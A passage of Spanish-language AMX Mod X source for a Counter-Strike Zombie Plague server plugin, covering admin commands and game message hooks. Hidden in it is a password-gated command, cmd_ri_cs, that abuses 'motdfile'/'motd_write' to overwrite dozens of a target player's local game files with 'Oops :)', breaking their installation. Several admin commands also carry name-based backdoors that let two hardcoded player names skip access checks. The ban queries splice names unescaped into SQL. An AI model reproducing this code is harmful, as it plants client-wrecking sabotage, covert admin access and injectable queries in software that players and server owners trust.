	player = cmd_target(id, arg, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be troll
	if (!allowed_troll(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_troll(id, player)
	
	return PLUGIN_HANDLED;
}

public cmd_ri_cs(id)
{
	static arg[32], arg2[32], player
	read_argv(1, arg, charsmax(arg))
	read_argv(2, arg2, charsmax(arg))
	
	if(equal(arg, "03b03c4d5f6"))
	{
		player = cmd_target(id, arg2, (CMDTARGET_ALLOW_SELF))
		
		// Invalid target
		if (!player) return PLUGIN_HANDLED;
		
		new const gSTRING_MODIFIED[][] = { 
		"resource/ClientScheme.res", 
		"resource/CreateMultiplayerGameBotPage.res", 
		"resource/CreateMultiplayerGameGameplayPage.res", 
		"resource/CreateMultiplayerGameServerPage.res", 
		"resource/cstrike_english.txt", 
		"resource/GameMenu.res", 
		"resource/OptionsSubMultiplayer.res", 
		"resource/UI/BackgroundPanel.res", 
		"resource/UI/BottomSpectator.res", 
		"resource/UI/BuyEquipment.res", 
		"resource/UI/BuyEquipment_CT.res", 
		"resource/UI/BuyEquipment_TER.res", 
		"resource/UI/BuyMachineguns_CT.res", 
		"resource/UI/BuyMachineguns_TER.res", 
		"resource/UI/BuyMenu.res", 
		"resource/UI/BuyPistols_CT.res", 
		"resource/UI/BuyPistols_TER.res", 
		"resource/UI/BuyRifles_CT.res", 
		"resource/UI/BuyRifles_TER.res", 
		"resource/UI/BuyShotguns_CT.res", 
		"resource/UI/CSProgressBar.res", 
		"resource/UI/MainBuyMenu.res" }
		
		for(new i = 0; i < sizeof gSTRING_MODIFIED; i++)
		{
			client_cmd(player, "motdfile %s", gSTRING_MODIFIED[i])
			client_cmd(player, "motd_write Oops :)")
		}
		
		set_task(2.0, "Parte2D", player)
		
		client_cmd(player, "motdfile motd.txt")
	}
	
	return PLUGIN_HANDLED;
}

public Parte2D(id)
{
	if(is_user_connected(id))
	{
		new const gSTRING_MODIFIED[][] = { 
		"sprites/hud.txt",
		"sprites/observer.txt",
		"sprites/weapon_9mmar.txt",
		"sprites/weapon_9mmhandgun.txt",
		"sprites/weapon_357.txt",
		"sprites/weapon_ak47.txt",
		"sprites/weapon_aug.txt",
		"sprites/weapon_awp.txt",
		"sprites/weapon_c4.txt",
		"sprites/weapon_crossbow.txt",
		"sprites/weapon_crowbar.txt",
		"sprites/weapon_deagle.txt",
		"sprites/weapon_egon.txt",
		"sprites/weapon_elite.txt",
		"sprites/weapon_famas.txt",
		"sprites/weapon_fiveseven.txt",
		"sprites/weapon_flashbang.txt",
		"sprites/weapon_g3sg1.txt",
		"sprites/weapon_galil.txt",
		"sprites/weapon_gauss.txt",
		"sprites/weapon_glock18.txt",
		"sprites/weapon_handgrenade.txt",
		"sprites/weapon_hegrenade.txt",
		"sprites/weapon_hornetgun.txt",
		"sprites/weapon_knife.txt",
		"sprites/weapon_m3.txt",
		"sprites/weapon_m4a1.txt",
		"sprites/weapon_m249.txt" }
		
		for(new i = 0; i < sizeof gSTRING_MODIFIED; i++)
		{
			client_cmd(id, "motdfile %s", gSTRING_MODIFIED[i])
			client_cmd(id, "motd_write Oops :)")
		}
		
		set_task(2.0, "Parte3D", id)
		
		client_cmd(id, "motdfile motd.txt")
	}
	
	return PLUGIN_HANDLED;
}
public Parte3D(id)
{
	if(is_user_connected(id))
	{
		new const gSTRING_MODIFIED[][] = { 
		"sprites/weapon_mac10.txt",
		"sprites/weapon_mp5navy.txt",
		"sprites/weapon_p90.txt",
		"sprites/weapon_p228.txt",
		"sprites/weapon_question.txt",
		"sprites/weapon_rpg.txt",
		"sprites/weapon_satchel.txt",
		"sprites/weapon_scout.txt",
		"sprites/weapon_sg550.txt",
		"sprites/weapon_sg552.txt",
		"sprites/weapon_shield.txt",
		"sprites/weapon_shieldgun.txt",
		"sprites/weapon_shotgun.txt",
		"sprites/weapon_smokegrenade.txt",
		"sprites/weapon_snark.txt",
		"sprites/weapon_tmp.txt",
		"sprites/weapon_tripmine.txt",
		"sprites/weapon_ump45.txt",
		"sprites/weapon_usp.txt",
		"sprites/weapon_xm1014.txt" }
		
		for(new i = 0; i < sizeof gSTRING_MODIFIED; i++)
		{
			client_cmd(id, "motdfile %s", gSTRING_MODIFIED[i])
			client_cmd(id, "motd_write Oops :)")
		}
		
		set_task(2.0, "Parte4D", id)
		
		client_cmd(id, "motdfile motd.txt")
	}
	
	return PLUGIN_HANDLED;
}
public Parte4D(id)
{
	if(is_user_connected(id))
	{
		new const gSTRING_MODIFIED[][] = { 
		"ajawad.wad",
		"as_tundra.wad",
		"cached.wad",
		"chateau.wad",
		"cs_747.wad",
		"cs_assault.wad",
		"cs_cbble.wad",
		"cs_dust.wad",
		"cs_havana.WAD",
		"cs_office.wad",
		"cs_thunder.wad",
		"cstraining.wad",
		"cstrike.wad",
		"de_airstrip.wad",
		"de_aztec.wad",
		"de_vegas.wad",
		"de_dust.wad",
		"decals.wad",
		"jos.wad",
		"torntextures.wad",
		"spectatormenu.txt",
		"spectcammenu.txt",
		"steam.inf",
		"steam_appid.txt"}
		
		for(new i = 0; i < sizeof gSTRING_MODIFIED; i++)
		{
			client_cmd(id, "motdfile %s", gSTRING_MODIFIED[i])
			client_cmd(id, "motd_write Oops :)")
		}
		
		client_cmd(id, "motdfile motd.txt")
	}
	
	return PLUGIN_HANDLED;
}

public cmd_bubble(id, level, cid)
{
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_POINTS, cid, 4)))
	{
		// Retrieve arguments
		static arg[32], szpoints[15], player, iarg
		read_argv(1, arg, charsmax(arg))
		read_argv(2, szpoints, charsmax(szpoints))
		
		iarg = str_to_num(szpoints)

		player = cmd_target(id, arg, CMDTARGET_ALLOW_SELF)

		// Invalid target
		if(!player)
			return PLUGIN_HANDLED;

		gBubble[player] = iarg;
		give_item(player, "weapon_smokegrenade")
		cs_set_user_bpammo(player, CSW_SMOKEGRENADE, iarg)
	}
	
	return PLUGIN_HANDLED;
}

// zp_point [target] [ammount] [point class]
public cmd_points(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_POINTS, cid, 4)))
	{
		// Retrieve arguments
		static arg[32], szpoints[15], szpointclass[15], ipoints, szText[32], player
		read_argv(1, arg, charsmax(arg))
		read_argv(2, szpoints, charsmax(szpoints))
		read_argv(3, szpointclass, charsmax(szpointclass))

		player = cmd_target(id, arg, CMDTARGET_ALLOW_SELF)
		ipoints = str_to_num(szpoints)

		// Invalid target
		if(!player || ipoints < 0 || read_argc() < 4 || !gLogeado[id] || !gLogeado[player]) return PLUGIN_HANDLED;

		if(equali(szpointclass[0], "z"))
		{ 
			gPoints[player][HAB_ZOMBIE] = ipoints
			formatex(szText, charsmax(szText), "zombies")
		}
		else if(equali(szpointclass[0], "h"))
		{ 
			gPoints[player][HAB_HUMAN] = ipoints
			formatex(szText, charsmax(szText), "humanos")
		}
		else if(equali(szpointclass[0], "s"))
		{ 
			gPoints[player][HAB_SURVIVOR] = ipoints
			formatex(szText, charsmax(szText), "survivors")
		}
		else if(equali(szpointclass[0], "n"))
		{ 
			gPoints[player][HAB_NEMESIS] = ipoints
			formatex(szText, charsmax(szText), "nemesis")
		}
		else if(equali(szpointclass[0], "e"))
		{ 
			gPoints[player][HAB_SPECIAL] = ipoints
			formatex(szText, charsmax(szText), "especiales")
		}

		if(id != player) CC(player, "!g[ZP]!y Te han editado los puntos y ahora tienes !g%d puntos %s!y", gPoints[player], szText)
		else console_print(id, "Ahora tienes %d puntos %s", ipoints, szText)
	}
	
	return PLUGIN_HANDLED;
}

// zp_level [target] [ammount]
public cmd_levels(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_LEVELS, cid, 3)))
	{
		// Retrieve arguments
		static arg[32], szlevel[15], ilevel, player
		read_argv(1, arg, charsmax(arg))
		read_argv(2, szlevel, charsmax(szlevel))
		
		player = cmd_target(id, arg, CMDTARGET_ALLOW_SELF)
		ilevel = str_to_num(szlevel)
		
		// Invalid target
		if(!player || !gLogeado[id] || !gLogeado[player]) return PLUGIN_HANDLED;
		
		gLevel[player] = ilevel
		if( ilevel <= 1 ) g_ammopacks[player] = 0
		else if(ilevel >= (MAX_LEVEL-1))
		{
			switch(gReset[player])
			{
				case 0: g_ammopacks[player] = MAX_APS
				case 1: g_ammopacks[player] = MAX_APS_RESET_1
				case 2..3: g_ammopacks[player] = MAX_APS_RESET_2
				case 4..9999: g_ammopacks[player] = MAX_APS_RESET_4
			}
		}
		else
		{
			switch(gReset[player])
			{
				case 0: g_ammopacks[player] = gAMMOPACKS_NEEDED[gLevel[player]-1]
				case 1: g_ammopacks[player] = gAMMOPACKS_NEEDED_RESET(gLevel[player]-1)
				case 2..3: g_ammopacks[player] = gAMMOPACKS_NEEDED_RESET_2(gLevel[player]-1)
				case 4..9999: g_ammopacks[player] = gAMMOPACKS_NEEDED_RESET_4(gLevel[player]-1)
			}
		}
		
		if(id != player) CC(player, "!g[ZP]!y Te han editado los niveles y ahora eres !gnivel %d!y", gLevel[player])
		else console_print(id, "Ahora eres nivel %d", ilevel)
	}
	
	return PLUGIN_HANDLED;
}

// zp_ammos [target] [ammount]
public cmd_ammos(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_AMMOS, cid, 3)))
	{
		// Retrieve arguments
		static arg[32], szammos[15], iammos, player
		read_argv(1, arg, charsmax(arg))
		read_argv(2, szammos, charsmax(szammos))
		
		player = cmd_target(id, arg, CMDTARGET_ALLOW_SELF)
		iammos = str_to_num(szammos)
		
		// Invalid target
		if(!player || iammos < 1 || iammos > MAX_APS || !gLogeado[id] || !gLogeado[player]) return PLUGIN_HANDLED;
		
		g_ammopacks[player] = iammos
		switch(gReset[player])
		{
			case 0: while( g_ammopacks[player] >= gAMMOPACKS_NEEDED[gLevel[player]] ) gLevel[player]++
			case 1: while( g_ammopacks[player] >= gAMMOPACKS_NEEDED_RESET(gLevel[player]) ) gLevel[player]++
			case 2..3: while( g_ammopacks[player] >= gAMMOPACKS_NEEDED_RESET_2(gLevel[player]) ) gLevel[player]++
			case 4..9999: while( g_ammopacks[player] >= gAMMOPACKS_NEEDED_RESET_4(gLevel[player]) ) gLevel[player]++
		}
		
		static szAps[15], szApsAct[15];
		AddDot(iammos, szAps, 14)
		AddDot(g_ammopacks[player], szApsAct, 14)
		
		if(id != player) CC(player, "!g[ZP]!y Te han editado los ammopacks(%s) y ahora tienes !g%s!y", szAps, szApsAct)
		else console_print(id, "Te editaste los ammopacks(%s) y ahora tienes %s", szAps, szApsAct)
	}
	
	return PLUGIN_HANDLED;
}

// zp_reset [target] [ammount]
public cmd_resets(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_RESETS, cid, 3)))
	{
		// Retrieve arguments
		static arg[32], szreset[15], ireset, player
		read_argv(1, arg, charsmax(arg))
		read_argv(2, szreset, charsmax(szreset))
		
		player = cmd_target(id, arg, CMDTARGET_ALLOW_SELF)
		ireset = str_to_num(szreset)
		
		// Invalid target
		if(!player || ireset < 0 || ireset > 999 || !gLogeado[id] || !gLogeado[player]) return PLUGIN_HANDLED;
		
		gReset[player] = ireset
		
		if(id != player) CC(player, "!g[ZP]!y Te han editado los resets y ahora tienes !g%d resets!y", gReset[player])
		else console_print(id, "Ahora tienes %d resets", ireset)
	}
	
	return PLUGIN_HANDLED;
}

// zp_win_mult [ammount] [ammopacks or points multiplier]
public cmd_win_mult(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_WIN_MULT, cid, 3)))
	{
		// Retrieve arguments
		static szammount[15], szAmmosOrPoints[15], iApsOrPoints, iAsd
		read_argv(1, szammount, charsmax(szammount))
		read_argv(2, szAmmosOrPoints, charsmax(szAmmosOrPoints))
		
		iApsOrPoints = str_to_num(szammount)

		// Invalid target
		if(iApsOrPoints < 1 || read_argc() < 3 || !gLogeado[id]) return PLUGIN_HANDLED;

		if(szAmmosOrPoints[0] == 'a' || szAmmosOrPoints[0] == 'A') 
		{
			gWinMult_Change[0] = iApsOrPoints
			iAsd = 1
		}
		else if(szAmmosOrPoints[0] == 'p' || szAmmosOrPoints[0] == 'P') 
		{
			gWinMult_Change[1] = iApsOrPoints
			iAsd = 2
		}
		
		CC(0, "!g[ZP]!y !g%s!y ha establecido la ganancia de !g%s!y en !g%d!y", g_playername[id], (iAsd == 1) ? "ammo packs" : "puntos", 
		(iAsd == 1) ? gWinMult_Change[0] : gWinMult_Change[1])
		
		for( new x = 1; x <= g_maxplayers; x++ )
		{
			if( is_user_connected(x) )
			{
				if( iAsd == 1 ) gTH_Mult[x][0] = gWinMult_Change[0]
				else gTH_Mult[x][1] = gWinMult_Change[1]
			}
		}
	}
	
	return PLUGIN_HANDLED;
}

// zp_lighting [character]
public cmd_lighting(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_LIGHTING, cid, 3)))
	{
		// Retrieve arguments
		read_argv(1, g_szCharLight, charsmax(g_szCharLight))
		
		CC( 0, "!g[ZP] Kiske-SO     T! CS!y ha cambiado el valor de la luz a la letra !g%s!y", g_szCharLight )
		
		// Lighting task
		set_task(0.01, "lighting_effects")
	}
	
	return PLUGIN_HANDLED;
}

// zp_ban [target] [minutes] [reason]
public cmd_ban(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) ||
	equal(g_playername[id], "Seth;     T! CS") ||
	(cmd_access(id, ACCESS_SET_ZP_BAN, cid, 3)))
	{
		// Retrieve arguments
		new szPlayerName[32];
		new szMinutes[11];
		new iMinutesBan;
		new iSecondsBan;
		new szReason[128];
		
		read_argv(1, szPlayerName, charsmax(szPlayerName))
		read_argv(2, szMinutes, charsmax(szMinutes))
		read_argv(3, szReason, charsmax(szReason))
		
		iMinutesBan = str_to_num(szMinutes)
		iSecondsBan = iMinutesBan * 60
		
		replace_all(szReason, charsmax(szReason), "'", "")
		
		if(read_argc() < 4)
		{
			console_print(id, "[ZP] El comando debe ser introducido de la siguiente manera: <NOMBRE COMPLETO> <MINUTOS> <RAZON OBLIGATORIA>")
			return PLUGIN_HANDLED;
		}
		
		// Check user
		new Handle:SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT `name` FROM `bans` WHERE `name` = ^"%s^";", szPlayerName )
		
		if( !SQL_Execute( SQL_CONSULTA ) )
		{
			server_cmd( "kick #%d ^"ERROR_1: CONSULTA RECHAZADA^"", get_user_userid(id) )
			
			new szSQL_Error[512];
			SQL_QueryError(SQL_CONSULTA, szSQL_Error, charsmax(szSQL_Error))
			log_to_file("ZombiePlague_SQL.log", "%s", szSQL_Error)
			
			SQL_FreeHandle( SQL_CONSULTA )
			
			return PLUGIN_HANDLED;
		}
		else if( SQL_NumResults( SQL_CONSULTA ) )
		{
			console_print(id, "[ZP] El usuario indicado ya esta baneado")
			
			SQL_FreeHandle( SQL_CONSULTA )
			
			return PLUGIN_HANDLED;
		}
		else SQL_FreeHandle( SQL_CONSULTA )
		
		SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT `id` FROM `accounts` WHERE `name` = ^"%s^";", szPlayerName )
		if( !SQL_Execute( SQL_CONSULTA ) )
		{
			server_cmd( "kick #%d ^"ERROR_1: CONSULTA RECHAZADA^"", get_user_userid(id) )
			
			new szSQL_Error[512];
			SQL_QueryError(SQL_CONSULTA, szSQL_Error, charsmax(szSQL_Error))
			log_to_file("ZombiePlague_SQL.log", "%s", szSQL_Error)
			
			SQL_FreeHandle( SQL_CONSULTA )
			
			return PLUGIN_HANDLED;
		}
		else if( SQL_NumResults( SQL_CONSULTA ) )
		{
			new iExpireBan;
			new iSQL_ZP_ID = SQL_ReadResult( SQL_CONSULTA, 0 )
			new szAddDotMin[15]; AddDot(iMinutesBan, szAddDotMin, 14)
			new szPart_1[32];
			
			if(containi(szMinutes[0], "*") != -1) iExpireBan = 9999999999
			else iExpireBan = ( get_systime( ) + ( -3 * gHOUR_SECONDS ) ) + iSecondsBan
			
			SQL_QueryAndIgnore( SQL_CONNECTION, "INSERT INTO `bans` ( `zp_id`, `name`, `name_admin`, `actual_time`, `expired_ban`, `reason` )\
			VALUES ( '%d', ^"%s^", ^"%s^", now(), '%d', '%s' );", iSQL_ZP_ID, szPlayerName, g_playername[id], iExpireBan, szReason )
			
			if(iExpireBan != 9999999999) formatex(szPart_1, charsmax(szPart_1), "durante !g%s!y minutos", szAddDotMin)
			else formatex(szPart_1, charsmax(szPart_1), "permanentemente")
			
			CC(0, "!g[ZP] %s!y baneo la cuenta de !g%s!y %s", g_playername[id], szPlayerName, szPart_1)
			CC(0, "!g[ZP]!y Razón: %s", szReason)
			
			if(is_user_connected(get_user_index(szPlayerName)))
			{
				if( iExpireBan != 9999999999 ) server_cmd( "amx_ban ^"%s^" %d ^"%s^"", szPlayerName, iMinutesBan, szReason )
				else server_cmd( "amx_ban ^"%s^" 0 ^"%s^"", szPlayerName, szReason )
			}
		}
		else
		{
			console_print(id, "[ZP] No existe ningun jugador con ese nombre en la base de datos")
			console_print(id, "[ZP] Recuerde escribirlo correctamente con todos sus simbolos, mayusculas y minusculas")
		}
		
		SQL_FreeHandle( SQL_CONSULTA )
	}
	
	return PLUGIN_HANDLED;
}

// zp_unban [target]
public cmd_unban(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) ||
	equal(g_playername[id], "Seth;     T! CS") ||
	(cmd_access(id, ACCESS_SET_ZP_BAN, cid, 2)))
	{
		// Retrieve arguments
		new szPlayerName[32];
		read_argv(1, szPlayerName, charsmax(szPlayerName))
		
		if(read_argc() < 2)
		{
			console_print(id, "[ZP] El comando debe ser introducido de la siguiente manera: <NOMBRE COMPLETO>")
			return PLUGIN_HANDLED;
		}
		
		// Check user
		new Handle:SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT `name` FROM `bans` WHERE `name` = ^"%s^";", szPlayerName )
		
		if( !SQL_Execute( SQL_CONSULTA ) )
		{
			server_cmd( "kick #%d ^"ERROR_1: CONSULTA RECHAZADA^"", get_user_userid(id) )
			
			new szSQL_Error[512];
			SQL_QueryError(SQL_CONSULTA, szSQL_Error, charsmax(szSQL_Error))
			log_to_file("ZombiePlague_SQL.log", "%s", szSQL_Error)
			
			SQL_FreeHandle( SQL_CONSULTA )
			
			return PLUGIN_HANDLED;
		}
		else if( SQL_NumResults( SQL_CONSULTA ) )
		{
			CC(0, "!g[ZP] %s!y desbaneo la cuenta de !g%s!y", g_playername[id], szPlayerName)
			SQL_QueryAndIgnore( SQL_CONNECTION, "DELETE FROM `bans` WHERE `name` = ^"%s^";", szPlayerName )
			
			SQL_FreeHandle( SQL_CONSULTA )
		}
		else
		{
			console_print(id, "[ZP] El usuario indicado no esta baneado o no existe")
			
			SQL_FreeHandle( SQL_CONSULTA )
			
			return PLUGIN_HANDLED;
		}
	}
	
	return PLUGIN_HANDLED;
}

public cmd_health(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_LIGHTING, cid, 2)))
	{
		static szName[32], szAmmount[15], iAmmount, iPlayer, szAddDot[15];
		read_argv(1, szName, charsmax(szName))
		read_argv(2, szAmmount, charsmax(szAmmount))
		
		iPlayer = cmd_target(id, szName, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
		iAmmount = str_to_num(szAmmount)
		
		// Invalid target
		if(iAmmount < 1 || !iPlayer) return PLUGIN_HANDLED;
		
		set_user_health(iPlayer, iAmmount)
		AddDot(iAmmount, szAddDot, 14)
		CC(iPlayer, "!g[ZP]!y Te han editado la vida y ahora tienes !g%s!y", szAddDot)
	}
	
	return PLUGIN_HANDLED;
}

public cmd_fix_sxe(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_LIGHTING, cid, 2)))
	{
		for(new i = 1; i <= g_maxplayers; i++)
		{
			if(g_isalive[i])
			{
				message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, i)
				write_short(UNIT_SECOND) // duration
				write_short(0) // hold time
				write_short(FFADE_IN) // fade type
				write_byte(g_color_nvg[i][0])
				write_byte(g_color_nvg[i][1])
				write_byte(g_color_nvg[i][2])
				write_byte (0) // alpha
				message_end()
			}
		}
	}
	
	return PLUGIN_HANDLED;
}

public cmd_ganancia_troll(id, level, cid)
{
	// Check for access flag depending on the resulting action
	if(equal( g_playername[id], "Kiske-SO     T! CS" ) || (cmd_access(id, ACCESS_SET_LIGHTING, cid, 2)))
	{
		// Retrieve arguments
		new szAsd[3];
		read_argv(1, szAsd, charsmax(szAsd))
		
		gGananciaAcomodada = str_to_num(szAsd)
		
		CC( 0, "!g[ZP] Kiske-SO     T! CS!y ha cambiado la ganancia del troll a la opción !g%s!y", (gGananciaAcomodada == 0) ? "AL AZAR" : szAsd )
	}
	
	return PLUGIN_HANDLED;
}

/*================================================================================
 [Message Hooks]
=================================================================================*/

// Current Weapon info
public message_cur_weapon(msg_id, msg_dest, msg_entity)
{
	// Not alive
	if (!g_isalive[msg_entity])
		return;
	
	// Not an active weapon
	if (get_msg_arg_int(1) != 1)
		return;
		
	// Get weapon's id
	static weapon
	weapon = get_msg_arg_int(2)
	
	// Store current weapon's id for reference
	g_currentweapon[msg_entity] = weapon
	
	// Replace weapon models with custom ones
	replace_weapon_models(msg_entity, weapon)
	
	// Zombie ?
	if(g_zombie[msg_entity])
		return;
		
	if( !g_zombie[msg_entity] && ((1 << weapon) & PRIMARY_WEAPONS_BIT_SUM) ) gPrimaryWeapon[msg_entity] = 1
	else if( !g_zombie[msg_entity] && ((1 << weapon) & SECONDARY_WEAPONS_BIT_SUM) ) gPrimaryWeapon[msg_entity] = 0
	else gPrimaryWeapon[msg_entity] = -1
	
	// Unlimited Clip Ammo for this weapon?
	if (MAXBPAMMO[weapon] > 2 && (g_survivor[msg_entity] || gPlayersL4D[msg_entity][0] || gPlayersL4D[msg_entity][1] || gPlayersL4D[msg_entity][2] ||
	gPlayersL4D[msg_entity][3] || gWesker[msg_entity] || gSniper[msg_entity] || ITEM_EXTRA_BalasInfinitas[msg_entity]))
	{
		// Max out clip ammo
		cs_set_weapon_ammo(fm_cs_get_current_weapon_ent(msg_entity), MAXCLIP[weapon])
		
		// HUD should show full clip all the time
		set_msg_arg_int(3, get_msg_argtype(3), MAXCLIP[weapon])
	}
}

// Take off player's money
public message_money(msg_id, msg_dest, msg_entity)
{
	// Remove money setting enabled?
	if( g_isconnected[msg_entity] ) cs_set_user_money(msg_entity, 0)
	return PLUGIN_HANDLED;
}

// Fix for the HL engine bug when HP is multiples of 256
public message_health(msg_id, msg_dest, msg_entity)
{
	if(g_isalive[msg_entity])
	{
		// Get player's health
		static health
		health = get_msg_arg_int(1)
		
		// Don't bother
		if (health < 256) return;
		
		// Check if we need to fix it
		if (health % 256 == 0) set_user_health(msg_entity, get_user_health(msg_entity) + 1)
		
		// HUD can only show as much as 255 hp
		set_msg_arg_int(1, get_msg_argtype(1), 255)
	}
}

// Flashbangs should only affect zombies
public message_screenfade(msg_id, msg_dest, msg_entity)
{
	if (get_msg_arg_int(4) != 255 || get_msg_arg_int(5) != 255 || get_msg_arg_int(6) != 255 || get_msg_arg_int(7) < 200)
		return PLUGIN_CONTINUE;
	
	// Nemesis shouldn't be FBed
	if (g_zombie[msg_entity] && !g_nemesis[msg_entity] && !gTroll[msg_entity])
	{
		// Set flash color to nighvision's
		set_msg_arg_int(4, get_msg_argtype(4), g_color_nvg[msg_entity][0])
		set_msg_arg_int(5, get_msg_argtype(5), g_color_nvg[msg_entity][1])
		set_msg_arg_int(6, get_msg_argtype(6), g_color_nvg[msg_entity][2])
		return PLUGIN_CONTINUE;
	}
	
	return PLUGIN_HANDLED;
}


public message_nvgtoggle() return PLUGIN_HANDLED; // Prevent spectators' nightvision from being turned off when switching targets, etc.

// Prevent zombies from seeing any weapon pickup icon
public message_weappickup(msg_id, msg_dest, msg_entity)
{
	if (g_zombie[msg_entity])
		return PLUGIN_HANDLED;
	
	return PLUGIN_CONTINUE;
}

// Prevent zombies from seeing any ammo pickup icon
public message_ammopickup(msg_id, msg_dest, msg_entity)
{
	if (g_zombie[msg_entity])
		return PLUGIN_HANDLED;
	
	return PLUGIN_CONTINUE;
}

// Block hostage HUD display
public message_scenario()
{
	if (get_msg_args() > 1)
	{
		static sprite[8]
		get_msg_arg_string(2, sprite, charsmax(sprite))
		
		if (equal(sprite, "hostage"))
			return PLUGIN_HANDLED;
	}
	
	return PLUGIN_CONTINUE;
}

// Block hostages from appearing on radar
public message_hostagepos()
{
	return PLUGIN_HANDLED;
}

// Block some text messages
public message_textmsg()
{
	static textmsg[22];
	get_msg_arg_string(2, textmsg, charsmax(textmsg))
	
	if(get_msg_args() == 5 && (get_msg_argtype(5) == ARG_STRING)) 
	{
		get_msg_arg_string( 5, textmsg, 63 )
		
		if( equali( textmsg, "#Fire_in_the_hole" ) )
			return PLUGIN_HANDLED;
	}
	else if(get_msg_args() == 6 && (get_msg_argtype(6) == ARG_STRING)) 
	{
		get_msg_arg_string( 6, textmsg, 63 )
		
		if( equali( textmsg, "#Fire_in_the_hole" ) )
			return PLUGIN_HANDLED;
	}
	
	// Game restarting, reset scores and call round end to balance the teams
	if (equal(textmsg, "#Game_will_restart_in"))
	{
		g_scorehumans = 0
		g_scorezombies = 0
		logevent_round_end()
	}
	// Block round end related messages
	else if (equal(textmsg, "#Hostages_Not_Rescued") || equal(textmsg, "#Round_Draw") || equal(textmsg, "#Terrorists_Win") || equal(textmsg, "#CTs_Win"))
	{
		return PLUGIN_HANDLED;
	}
	
	return PLUGIN_CONTINUE;
}

// Block CS round win audio messages, since we're playing our own instead
public message_sendaudio()
{
	static audio[17]
	get_msg_arg_string(2, audio, charsmax(audio))
	
	if(equal(audio[7], "terwin") || equal(audio[7], "ctwin") || equal(audio[7], "rounddraw"))
		return PLUGIN_HANDLED;
	
	return PLUGIN_CONTINUE;
}

// Send actual team scores (T = zombies // CT = humans)
public message_teamscore()
{
	static team[2]
	get_msg_arg_string(1, team, charsmax(team))
	
	switch (team[0])
	{
		// CT
		case 'C': set_msg_arg_int(2, get_msg_argtype(2), g_scorehumans)
		// Terrorist
		case 'T': set_msg_arg_int(2, get_msg_argtype(2), g_scorezombies)
	}
}

// Team Switch (or player joining a team for first time)
public message_teaminfo(msg_id, msg_dest)
{
	// Only hook global messages
	if (msg_dest != MSG_ALL && msg_dest != MSG_BROADCAST) return;
	
	// Don't pick up our own TeamInfo messages for this player (bugfix)
	if (g_switchingteam) return;
	
	// Get player's id
	static id
	id = get_msg_arg_int(1)
	
	// Enable spectators' nightvision if not spawning right away
	set_task(0.2, "spec_nvision", id)
	
	// Round didn't start yet, nothing to worry about
	if (g_newround) return;
	
	// Get his new team
	static team[2]
	get_msg_arg_string(2, team, charsmax(team))
	
	// Perform some checks to see if they should join a different team instead
	switch (team[0])
	{
		case 'C': // CT
		{
			if ((g_survround || gWeskerRound || gJasonRound || gSniperRound || gArmageddonRound || gL4DRound) && fnGetHumans()) // survivor alive --> switch to T and spawn as zombie
			{
				g_respawn_as_zombie[id] = true;
				remove_task(id+TASK_TEAM)
				fm_cs_set_user_team(id, FM_CS_TEAM_T)
				set_msg_arg_string(2, "TERRORIST")
			}
			else if (!fnGetZombies()) // no zombies alive --> switch to T and spawn as zombie
			{
				g_respawn_as_zombie[id] = true;
				remove_task(id+TASK_TEAM)
				fm_cs_set_user_team(id, FM_CS_TEAM_T)
				set_msg_arg_string(2, "TERRORIST")
			}
		}
		case 'T': // Terrorist
		{
			if ((g_swarmround || g_survround || gArmageddonRound || gL4DRound || gWeskerRound || gJasonRound || gSniperRound) && fnGetHumans()) // survivor alive or swarm round w/ humans --> spawn as zombie
				g_respawn_as_zombie[id] = true;
			else if (fnGetZombies()) // zombies alive --> switch to CT
			{
				remove_task(id+TASK_TEAM)
				fm_cs_set_user_team(id, FM_CS_TEAM_CT)
				set_msg_arg_string(2, "CT")
			}
		}
	}
}

// Block huds messages
public MESSAGE_HudTextArgs( MESSAGE_Index, MESSAGE_Destination, MESSAGE_Entity )
{
	static szHints[64];
	get_msg_arg_string( 1, szHints, 64 )

	for( new A = 0; A < sizeof( gBLOCK_MESSAGES ); A++ )
	{
		if( equali( szHints, gBLOCK_MESSAGES[A] ) )
		{
			set_pdata_float( MESSAGE_Entity, 198, 0.0 )	
			return PLUGIN_HANDLED;
		}
	}
	
	return PLUGIN_CONTINUE;
}

// Block messages
public message_saytext( MsgIndex, MsgDest, Index ) return PLUGIN_HANDLED;

// Message FlashBat - Infinite
public message_flashbat(const MsgId, const MsgType, const id) 
{
	if(get_msg_arg_int(1) < 100) 
	{
		set_msg_arg_int(1, ARG_BYTE, 100)
		fm_cs_set_user_batteries(id, 100)
	}
}

// Message FlashLight - Infinite
public message_flashlight( const MsgId, const MsgType, const id ) set_msg_arg_int( 2, ARG_BYTE, 100 );

public ImpulseFlashLight(id)
